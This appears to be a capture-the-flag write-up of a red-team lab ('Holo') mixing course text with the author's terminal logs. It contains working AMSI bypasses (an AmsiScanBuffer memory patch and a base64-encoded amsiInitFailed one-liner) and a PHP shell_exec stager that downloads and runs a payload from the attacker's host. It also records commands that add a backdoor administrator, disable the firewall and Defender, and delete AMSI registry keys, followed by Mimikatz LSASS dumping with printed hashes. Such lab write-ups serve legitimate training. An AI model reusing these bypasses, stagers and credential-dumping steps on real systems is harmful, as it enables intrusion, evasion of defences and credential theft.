There are several various methods of string concatenation and other techniques that we can use to break signatures. Find an outline of the different methods below.
-   Concatenate - `('co'+'ffe'+'e')`
-   Reorder - `('{1}{0}'-f'ffee','co')`
-   Whitespace - `( 'co' +'fee' + 'e')`
String manipulation usually will help break single-string weak signatures; as previously explained, AMSI can also use regex to aggregate risk assessment. We will need to use more advanced techniques like encoding and type acceleration in regex signatures found below.
The second method of manual obfuscation we will look at is type acceleration. From the Microsoft documentation, "Type accelerators are aliases for .NET framework classes. They allow you to access specific .NET framework classes without having to type the full class name explicitly. For example, you can shorten the `AliasAttribute` class from `[System.Management.Automation.AliasAttribute]` to `[Alias]`." [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_type_accelerators?view=powershell-7.1)
We can abuse type accelerators to modify malicious types and break the signatures of types. For example, you can use PowerShell to create your own `PSObject` and type accelerator to be used in place of the malicious type and, in turn, break the AMSI signature.
This may seem like an intimidating topic at first, but we can break it down into two lines of code to make it easier to understand.
To create a type accelerator, we will need to first declare a `PSObject` in Assembly to retrieve the type.
`[PSObject].Assembly.GetType`
We will then need to add our malicious type to `System.Management.Automation.TypeAccelerators`. This will allow us to use the type accelerator as a separate type from the malicious type. Find example code below.
`("System.Management.Automation.TypeAccelerators")::Add('dorkstork', [system.runtime.interopservices.marshal])`
We can combine these two code snippets to create a final `PSObject` containing the newly created type.
`[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('dorsktork', [system.runtime.interopservices.marshal])`
We can then replace the `PSObject` at the location of the malicious type. Find a comparison of the new and old code below.
Old: `[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);`
New: `[dorkstork]::copy($buf, 0, $BufferAddress, 6);`
Now we have a newly created type accelerator that will break the signature attached to it.
For more information about creating type accelerators within PowerShell, check out this blog, [https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)[](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)
[
](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)
To entirely obfuscate our code and ensure our bypass works, we can combine the two techniques shown. In addition, you can rerun AMSITrigger as needed to help identify broken signatures and other signatures not yet broken.
At this point, you should now have a working AMSI bypass. You can now move on to obfuscating and modifying our grunt and launcher itself to evade AV.
For more information about manual obfuscation and AMSI obfuscation, check out the following resources.
-   [](https://amsi.fail/)[https://amsi.fail/](https://amsi.fail/)
-   [](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)[https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)
-   [](https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)[https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research//How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
-   [](https://www.youtube.com/watch?v=lP2KF7_Kwxk)[https://www.youtube.com/watch?v=lP2KF7_Kwxk](https://www.youtube.com/watch?v=lP2KF7_Kwxk)
-   [](https://www.youtube.com/watch?v=F_BvtXzH4a4)[https://www.youtube.com/watch?v=F_BvtXzH4a4](https://www.youtube.com/watch?v=F_BvtXzH4a4)
Answer the questions below
Read the above and create a working AMSI bypass.
Completed
```text
https://github.com/jesusgavancho/AMSI-Holo (I'll be uploading compiled)

PS C:\Users\User> $OBF = 'Ob' + 'fu' + 's' +'cation'
PS C:\Users\User> $OBF
Obfuscation
PS C:\Users\User> $la = ('{1}{0}'-f'ffee','co')
PS C:\Users\User> $la
coffee
PS C:\Users\User> $1 = ( 'co' +'fee' + 'e')
PS C:\Users\User> $1
cofeee
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ mv ../Downloads/AmsiTrigger.exe .
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ ls
AmsiTrigger.exe  bypass-test.ps1  dotnet-install.sh  hash            rev.php
bash_scan.sh     chisel           fake_id_rsa        python_scan.py  rev.sh
bypass-AMSI.ps1  Covenant         fake_id_rsa.pub    rev_2.php
```
### AV Evasion JU57 0BFU$C47E 1T
Now that we have bypassed AMSI, we need to obfuscate and modify our launcher and grunt code to evade anti-virus. We will begin by understanding the basics of using automated obfuscators like Invoke-Obfuscation and ISE-Steroids to perform advanced string and signature manipulation.
We again recommend using a development virtual machine to test and edit code.
Invoke-Obfuscation, [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), is a utility built by Daniel Bohannon and Cobbr. It is used to take a series of arguments/obfuscation tokens and automatically obfuscate provided code. From their GitHub, "Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.". Red teamers can use obfuscation to make reverse engineering/analysis harder and, in some cases, bypass anti-virus and other detections.
Invoke-Obfuscation syntax can seem very large and scary at first if you don't understand how it breaks down the obfuscation tokens. We can follow along with this guide created by the author of Invoke-Obfuscation to get familiar with the syntax [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide).
To begin our obfuscation attempts, we will need to set the script block or the payload we want to obfuscate and then specify tokens to use. Invoke-Obfuscation offers both an argument parsing command-line tool as well as a friendly CLI. For our purposes, we will be using the command line. We will only be covering an example of using a token to bypass anti-virus, creating a token command, and the various use cases are out of scope for this task.
Below is the command we will use to obfuscate our payload. The token command used at the time of writing will bypass anti-virus for some payloads or tools. We will be breaking this command down later in this task.
`Invoke-Obfuscation -ScriptBlock {'Payload Here'} -Command 'Token\\String\\1,2,\\Whitespace\\1' -Quiet -NoExit`
To begin breaking down the command, we will first look at the arguments passed to the tool. The `ScriptBlock` argument will parse your payload or code used to be obfuscated. The two arguments at the end of the command `-Quiet` and `-NoExit` will produce minimal verbosity and prevent exiting from the CLI when the command is run.
The token used can be found by itself below, along with an explanation of what the token is doing.
`Token\\String\\1,2,\\Whitespace\\1`
To begin understanding the syntax, we need to understand the tree structure of Invoke-Obfuscation itself. The CLI helps with this and can break down each syntax tree in the overall syntax.
The first initial tree in this syntax is `Token\\String\\1,2,\\` this means it will both concatenate and reorder characters in a string. We can get this information from the CLI syntax tree found below.
![](https://i.imgur.com/OVd0z8W.png)
We can see both of the types of string obfuscation broken down, and examples are given.
1.  `TOKEN\\STRING\\1` - ('co'+'ffe'+'e')
2.  `TOKEN\\STRING\\2` - ('{1}{0}'-f'ffee','co')
The token command will also use a second syntax tree, this time obfuscating using whitespace in `Token\\Whitespace\\1`. We can again get this information from the CLI syntax tree found below.
![](https://i.imgur.com/tY9y4gL.png)
We can see that the obfuscation technique will randomly add whitespace to the provided strings and payload, along with an example of how it is used.
1.  `TOKEN\\WHITESPACE\\1` - ( 'co' +'fee' + 'e')
When creating a token command, you will need to be careful not to obfuscate the payload too much and exceed the 8191 character limit in a Windows command prompt. For more information about character limitation look at the Microsoft documentation, [https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation](https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)
If obfuscated efficiently, you should now have a successful PowerShell payload that will bypass anti-virus and make reverse engineering harder. Before executing on a production environment, you should always experiment and test on your development server to ensure that everything goes smoothly during the actual production engagement.
In the next task, we will cover what you can do when obfuscation fails, or you need to use something that isn't purely written in PowerShell by utilizing code review and ThreatCheck/DefenderCheck.
Answer the questions below
Read the above and attempt to obfuscate your payload to evade AV.
Completed
```text
PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/AmsiTrigger.exe -outfile c:\Scripts\AmsiTrigger.exe
PS C:\Scripts> ls

    Directory: C:\Scripts

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         2/2/2023  12:11 AM          27648 AmsiTrigger.exe                                                       
-a----       11/21/2020   4:37 AM            426 log.txt                                                               
-a----       11/21/2020   4:36 AM            391 monitor.ps1
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.200.108.31 - - [01/Feb/2023 19:09:37] "GET /AmsiTrigger.exe HTTP/1.1" 200 -
10.200.108.31 - - [01/Feb/2023 19:12:24] "GET /bypass-test.ps1 HTTP/1.1" 200 -

PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/bypass-test.ps1 -outfile c:\Scripts\bypass-test.ps1

PS C:\Scripts> .\AmsiTrigger.exe -i bypass-test.ps1 -f 3
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
PS C:\Scripts> .\AmsiTrigger.exe -i bypass-test.ps1 -f 1
[+] "::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy("
```
### AV Evasion 'Ca' + 'n' + 'you' + ' ' + 'see' + 'me now' + '?'
Up to this point, we should have a working PoC payload and grunt. However, in many cases, the basic steps of bypassing AMSI and obfuscating code may not work. In this case, we will need to use other tools and techniques to manually identify bad bytes within the code and review the code to break signatures to get the code past AMSI and Defender cleanly.
As new EDR solutions and prevention methods are released, we as red teamers need to change and evolve our TTPs to work around the ever-growing blue team. Often, techniques themselves don't change, but scripts and solutions like [https://github.com/IonizeCbr/AmsiPatchDetection](https://github.com/IonizeCbr/AmsiPatchDetection) and indicators can make it harder to get our payloads and tools past even when bypassed and obfuscated, or we have other restrictions in place we need to workaround. In this case, we can use code analysis and manual code review to break signatures. A few tools can help us along the way for code analysis, including ThreatCheck, [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), and DefenderCheck, [https://github.com/matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck). Both of these tools will ingest a given file and output the found bytes attached to signatures.
We again recommend using a development virtual machine to test and edit code.
As covered in Task 7, you will need to build Threat Check using a Visual Studio solution file. It is important to note that Threat Check uses multiple NuGet packages; ensure your development machine has internet access to retrieve these packages. The build process will produce an application file, a DLL file, and an XML file. You will need all three files in the same directory for ThreatCheck to work. Files will be built to `ThreatCheck-master\\ThreatCheck\\ThreatCheck\\bin\\Debug`.
![](https://i.imgur.com/3J75SEg.png)
ThreatCheck has a small argument list, and syntax is relatively straightforward. Find a list of arguments and a syntax example below.
-   `-e` or `—engine` (AMSI or Defender)
-   `-f` or `—file`
-   `-u` or `—url`
Syntax: `ThreatCheck.exe -f <file>`
In this task, we will be focusing on analyzing the Covenant source code; however, ThreatCheck can be used on any tools or payloads you need to clean.
Below you will find an example of the first bad byte that ThreatCheck will discover. ThreatCheck will aggregate bytes based on their signature strength, the lowest being the strongest signature and what you should prioritize breaking.
![](https://i.imgur.com/ta0edFX.png)
To aid us in breaking up the Covenant signature, we will follow this guide written by RastaMouse, [https://offensivedefence.co.uk/posts/covenant-profiles-templates/](https://offensivedefence.co.uk/posts/covenant-profiles-templates/).
Looking through the output of ThreatCheck, we notice a `WebProxy` along with an `http://192.168.227.139:80`. We can assume it is attached to the listener from these signatures rather than the grunt code itself. To break this signature, we can create a custom listener profile or edit the current HTTP profile.
Thanks to prior research from RastaMouse, we know that you will need to add an HTTP response header to break the signature. If you were going into this blind, you would need to experiment with settings and code to identify where the engine is attaching and what you can do to break it. Add the below line to your listener profile under `Listeners > Profiles > CustomHttpProfile`.
![](https://i.imgur.com/Mln6bIX.png)
Once added, we can build our agent again and test against ThreatCheck again.
![](https://i.imgur.com/qPW35Nb.png)
The output above has two signatures attached. Use your knowledge of HTTP requests and responses to break the signature.
You will also notice a `GUID Type` signature. Use your knowledge of C# from Task 6 along with RastaMouse's guide to break this signature and create a clean grunt.
You will have to repeat this process of going back and forth between ThreatCheck and the source code until you have a clean agent that evades detections.
If successful, you will now have a clean tool or payload that evades Defender.
Answer the questions below
Read the above and attach your clean AMSI bypass to the payload to evade detections.
Completed
Submit the flags from S-SRV01 in Task 4.
Completed
```text
┌──(kali㉿kali)-[~/Holo]
└─$ cat bypass-test-final.ps1 
$MethodDefinition = "
[DllImport(`"kernel32`")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('dorsktork', [system.runtime.interopservices.marshal])
[dorkstork]::copy($buf, 0, $BufferAddress, 6);
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.200.108.31 - - [01/Feb/2023 22:20:20] "GET /bypass-test-final.ps1 HTTP/1.1" 200 -

PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/bypass-test-final.ps1 -outfile c:\Scripts\bypass-test-final.ps1
PS C:\Scripts> ./AmsiTrigger.exe -i bypass-test-final.ps1 -f 3
[+] AMSI_RESULT_NOT_DETECTED
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ git clone https://github.com/jesusgavancho/AMSI-Holo.git
Cloning into 'AMSI-Holo'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 17 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (17/17), 152.52 KiB | 260.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ cd AMSI-Holo
```
```text
┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
└─$ ls
AmsiTrigger.exe  CommandLine.dll  CommandLine.xml  README.md  ThreatCheck.exe
```
```text
┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.200.108.31 - - [01/Feb/2023 22:25:39] "GET /CommandLine.dll HTTP/1.1" 200 -
10.200.108.31 - - [01/Feb/2023 22:25:51] "GET /CommandLine.xml HTTP/1.1" 200 -
10.200.108.31 - - [01/Feb/2023 22:26:09] "GET /ThreatCheck.exe HTTP/1.1" 200 -

PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/CommandLine.dll -outfile c:\Scripts\CommandLine.dll
PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/CommandLine.xml -outfile c:\Scripts\CommandLine.xml
PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/ThreatCheck.exe -outfile c:\Scripts\ThreatCheck.exe
```
### AV Evasion Wrapping the burrito
Now that we have a working executable that can bypass anti-virus, we need a way to execute it. We know that web servers cannot execute applications, so we will need to write a PHP wrapper to download and execute our code for us.
We will be using a template payload/wrapper that we can use to deploy PowerShell commands on the remote server for this task. This will allow us to download and execute our malicious application. Find the source code for the template below.
`<?php     function compile_stager() {       $init = "powershell.exe";       $payload = ""; // Insert PowerShell payload here       $execution_command = "shell_exec";       $query = $execution_command("$init $payload");       echo $query; // Execute query     }         compile_stager();   ?>   `
The above wrapper takes advantage of the `shell_exec` command to open a process on the server and execute commands as the webserver. Of course, this will only work if you can execute privileges on the system.
You can decide to either upload an exe grunt or create a ps1 grunt either will work with the template.
To download our malicious grunt we can set up an HTTP server on our attacking machine using python, updog, etc and use `iex` or `Invoke-WebRequest` to make a remote call to our server. Find the download payload below.
To download our malicious grunt, we can set up an HTTP server on our attacking machine using python, updog, etc and use `iex` or `Invoke-WebRequest` to make a remote call to our server. Find the download payload below.
`Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe`
To implement this payload, you will need to change the address and port to your attacking machine. You may also want to begin by identifying the webserver's root directory to identify where you can and cannot execute the file, such as if AppLocker or other solutions are employed on the server.
After we have downloaded the file, we will want to execute it using PowerShell. First, find the execution payload below.
`.\notashell.exe` or `cmd /c .\notashell.exe`
We can put together all payloads into the wrapper to complete our PHP payload. Find the final PHP code below.
`<?php     function get_stager() {       $init = "powershell.exe";       $payload = "Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here       $execution_command = "shell_exec";       $query = $execution_command("$init $payload");       echo $query; // Execute query     }    function execute_stager() {     $init = "powershell.exe";       $payload = ".\notashell.exe"; // Insert PowerShell payload here       $execution_command = "shell_exec";       $query = $execution_command("$init $payload");       echo $query; // Execute query    }     get_stager();     execute_stager();     die();   ?>`
We now have a working PHP shell that operates with Covenant. You can find the source code on GitHub, [https://github.com/Cryilllic/PHP-PowerShell/tree/main](https://github.com/Cryilllic/PHP-PowerShell/tree/main).
Answer the questions below
Read the above and upload your PHP shell.
Completed
Submit flags on S-SRV01 to Task 4.
Completed
Now that we have administrator access to the machine, we can follow our post-exploitation methodology and dump credentials. To aid us in dumping credentials, we will be using the infamous tool Mimikatz. We will also be utilizing Covenant to drop Mimikatz.
Mimikatz is a well-known tool for a variety of post-exploitation activities. We will be using it to dump credentials from LSASS. [T1003](https://attack.mitre.org/techniques/T1003/001/) From MITRE ATT&CK. Described from ATT&CK as "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores various credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material."
To run Mimikatz, we can use Covenant to drop the binary. Covenant has a task for Mimikatz; however, it is outdated and does not work on modern Windows systems, so we will need to compile or download our binary to use.
We can upload a Mimikatz binary using the `Upload` task and obtain a binary from the releases page [https://github.com/gentilkiwi/mimikatz/releases/](https://github.com/gentilkiwi/mimikatz/releases/) or compile the project yourself. Covenant will present you with a pop-up window to drop the file onto, and Covenant will host the file for you and upload the file to the server. Find an example of the window below.
![](https://i.imgur.com/hxjbw1U.png)
To ensure a successful upload, you will need to specify where the file is to be uploaded on the target and the file's location on your attacking machine. Find an example of file path syntax below.
![](https://i.imgur.com/KUdJPzZ.png)
Once the file is uploaded, we can use the `Shell` task to execute the binary. Since Mimikatz has its own CLI, you will need to send all commands to be run within Mimikatz in one command so that Covenant can interpret it.
---
Now that we have Mimikatz executing on the system, we can look through its modules and syntax. Find an outline of a few Mimikatz modules below.
-   `standard`
-   `privilege`
-   `crypto`
-   `sekurlsa`
-   `kerberos`
-   `lsadump`
-   `vault`
-   and more
For this task, we will be focusing on the `privilege`, `token`, and `sekurlsa` modules. Within each of these modules, a number of commands can be used to perform various operations. For more information about all the features of Mimikatz, check out the GitHub wiki, [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki).
The first module we will be looking at is `privilege`, from this module, we will use the `privilege::debug` command. This command will allow us to ensure that Mimikatz is running at the proper privilege levels before performing any operations.
The second module we will be looking at is `token`, from this module, we will use the `token::elevate` command. This command will perform token impersonation to gain elevated integrity on the system. Token elevation is not always necessary but can help to troubleshoot when Mimikatz is struggling to dump credentials.
The third module we will be looking at is `sekurlsa`, this module will contain a majority of the commands to interact with and abuse LSASS. From this module, we will be using the `sekurlsa::logonpasswords`. This command will dump the credentials of accounts already authenticated to the endpoint. We can also use the command `lsadump::lsa`, which has a similar function but will dump LSASS credentials from memory.
We can put all of these commands together to make a final Mimikatz command that we can use in Covenant. If using this tool normally, you could send each one of these commands separately, but we have to send them a little bit differently because we are using Covenant. Find example syntax below for Mimikatz.
Syntax: `.\Mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit`
It is important that you exit Mimikatz, or your shell task will never complete.
We should now have a working method to dump credentials on the endpoint.
Answer the questions below
```powershell
First Creating Persistence Access

net user hacker hackP@ssw0rd /add

net localgroup administrators hacker /add

netsh advfirewall set allprofiles state off

net localgroup "Remote Desktop Users" Everyone /Add

Defense Evasion

AMSI disable

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

PS C:\Users> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

The command `Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse` is a PowerShell command used to remove a specific registry key and its subkeys from the Windows registry. The registry key being removed is related to the Microsoft Antimalware Scan Interface (AMSI), which provides enhanced security for PowerShell scripts and other applications.

Removing this registry key and its subkeys can potentially impact the security of the device and the functioning of applications that use AMSI, so it should only be done if it is necessary for a specific task or use case and with caution. It is always recommended to backup the registry before making any changes.

PS C:\web\htdocs\images> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

The commands `Set-MpPreference -DisableIOAVProtection $true` and `Set-MpPreference -DisableRealtimeMonitoring 1` are similar in that they both disable protection features in Microsoft Defender Antivirus. However, they are different in their specific purpose.

`Set-MpPreference -DisableIOAVProtection $true` disables the Integrated Object AV (IOAV) protection feature, which helps to protect against malicious files and other threats that can enter a system through the internet or other means.

or

Set-MpPreference -DisableRealtimeMonitoring $true

`Set-MpPreference -DisableRealtimeMonitoring 1` disables real-time monitoring, which provides continuous protection for the device by detecting and blocking malicious activities in real-time.

Disabling either of these features can make the device more vulnerable to malicious threats, so it is important to only do so if it is necessary for a specific task or use case.

PS C:\web\htdocs\images> Set-MpPreference -DisableRealtimeMonitoring $true

Now using Mimikatz
```
```powershell
┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
└─$ locate mimikatz.exe
/home/kali/Downloads/learning_kerberos/mimikatz.exe
/home/kali/Set/mimikatz.exe
/home/kali/ra/mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```
```powershell
┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
└─$ cp /home/kali/Set/mimikatz.exe mimikatz.exe
```
```powershell
┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.200.108.31 - - [01/Feb/2023 23:05:19] "GET /mimikatz.exe HTTP/1.1" 200 -

PS C:\web\htdocs\images> cd c:\Scripts
PS C:\Scripts> Invoke-WebRequest http://10.50.104.206:1337/mimikatz.exe -outfile c:\Scripts\mimikatz.exe

PS C:\Scripts> .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

668	{0;000003e7} 1 D 21397     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 2600420   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,28p)	Primary
 * Thread Token  : {0;000003e7} 1 D 2625783   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 343652 (00000000:00053e64)
Session           : Interactive from 1
User Name         : watamet
Domain            : HOLOLIVE
Logon Server      : DC-SRV01
Logon Time        : 2/2/2023 3:17:25 AM
SID               : S-1-5-21-471847105-3603022926-1728018720-1132
	msv :	
	 [00000003] Primary
	 * Username : watamet
	 * Domain   : HOLOLIVE
	 * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
	 * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
	 * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
	tspkg :	
	wdigest :	
	 * Username : watamet
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : watamet
	 * Domain   : HOLO.LIVE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : S-SRV01$
Domain            : HOLOLIVE
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:03 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
	 * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
	tspkg :	
	wdigest :	
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : s-srv01$
	 * Domain   : HOLO.LIVE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 27323 (00000000:00006abb)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:03 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
	 * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
	tspkg :	
	wdigest :	
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : S-SRV01$
	 * Domain   : holo.live
	 * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef 
	ssp :	
	credman :	

Authentication Id : 0 ; 26086 (00000000:000065e6)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
